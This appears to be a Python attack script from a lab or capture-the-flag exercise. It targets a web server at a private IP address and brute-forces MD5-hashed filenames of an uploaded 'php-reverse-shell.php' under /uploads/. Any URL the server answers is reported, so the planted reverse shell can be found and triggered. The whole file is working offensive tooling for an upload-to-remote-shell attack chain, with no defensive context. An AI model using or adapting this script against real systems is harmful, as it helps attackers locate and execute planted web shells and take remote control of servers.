#!/usr/bin/env python

import requests
import hashlib

filename = 'php-reverse-shell.php'

# filehash = hashlib.md5(filename).hexdigest()


def hash_array():
    url = 'http://192.168.11.155:8000/uploads/'
    test_url = 'http://192.168.11.155:8000/'
    testreq = requests.get(test_url)
    print(testreq, testreq.url)
    if testreq.status_code == 200:
        print("it's working.")

    array_of_hashes = []
    for i in range(0, 101):
        array_of_hashes.append(hashlib.md5(filename + str(i)).hexdigest())

    # check_hash = '28c043dc46e53882b03d90314e7f46ba'
    # print(array_of_hashes)
    # print(check_hash)

    for hashsum in array_of_hashes:
        raw_hash = hashsum.strip()
        # print(hashsum)
        r = requests.get(url + raw_hash + '.php')
        # print(r, r.url)
        if r.status_code == 200:
            print("[+] Discovered URL! : " + str(r) + "\t\t\t" + str(r.url))
        elif r.status_code == 301:
            print("[+] Discovered URL! : " + str(r) + "\t\t\t" + str(r.url))
        elif r.status_code == 302:
            print("[+] Discovered URL! : " + str(r) + "\t\t\t" + str(r.url))
        elif r.status_code == 403:
            print("[+] Discovered Forbidden URL : " + str(r) + "\t\t\t" +
                  str(r.url))
        elif r.status_code == 303:
            print("[+] Discovered URL : " + str(r) + "\t\t\t" + str(r.url))
        elif r.status_code == 404:
            # print("[+] DOESN'T EXIST: " + str(r) + "\t\t\t" + str(r.url))
            pass

    # if check_hash in array_of_hashes:
    #     print("it does exist!")
    # else:
    #     print("nothing to see here.")


hash_array()
